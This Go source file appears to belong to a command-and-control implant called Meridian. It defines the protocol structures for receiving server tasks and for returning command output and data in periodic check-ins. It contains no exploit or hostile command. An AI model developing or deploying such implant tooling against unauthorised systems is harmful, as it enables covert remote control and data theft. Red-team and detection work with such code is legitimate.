// Package mproto defines the wire structures exchanged with the Meridian
// server (mirrors meridian/models.py + meridian/sessions.py).
package mproto

import (
	"encoding/json"
	"time"

	"meridian/implant/internal/mcrypto"
)

// Task is a server-issued job.
type Task struct {
	ID      string         `json:"id"`
	Module  string         `json:"module"`
	Args    map[string]any `json:"args"`
	TTL     int            `json:"ttl"`
	Created float64        `json:"created"`
}

// Result is the outcome of running a task.
type Result struct {
	ID       string
	Status   string
	ExitCode int
	Stdout   []byte
	Stderr   []byte
	Data     []byte // nil => no data field on the wire
}

// ToWire renders a result for the server's TaskResult parser.
func (r *Result) ToWire() map[string]any {
	w := map[string]any{
		"id":         r.ID,
		"status":     r.Status,
		"exit_code":  r.ExitCode,
		"stdout_b64": mcrypto.B64(r.Stdout),
		"stderr_b64": mcrypto.B64(r.Stderr),
		"data_b64":   "",
	}
	if r.Data != nil {
		w["data_b64"] = mcrypto.B64(r.Data)
	}
	return w
}

// CheckinBody is the plaintext carried by an envelope.
type CheckinBody struct {
	Results []map[string]any `json:"results"`
	Meta    map[string]any   `json:"meta,omitempty"`
	TS      float64          `json:"ts"`
}

// NewCheckinBody builds a checkin payload.
func NewCheckinBody(results []Result, meta map[string]any) []byte {
	wr := make([]map[string]any, 0, len(results))
	for i := range results {
		wr = append(wr, results[i].ToWire())
	}
	b, _ := json.Marshal(CheckinBody{Results: wr, Meta: meta, TS: float64(time.Now().UnixMilli()) / 1000})
	return b
}

// CheckinReply is the decrypted reply to a checkin.
type CheckinReply struct {
	Tasks     []Task `json:"tasks"`
	SessionID string `json:"session_id"`
}
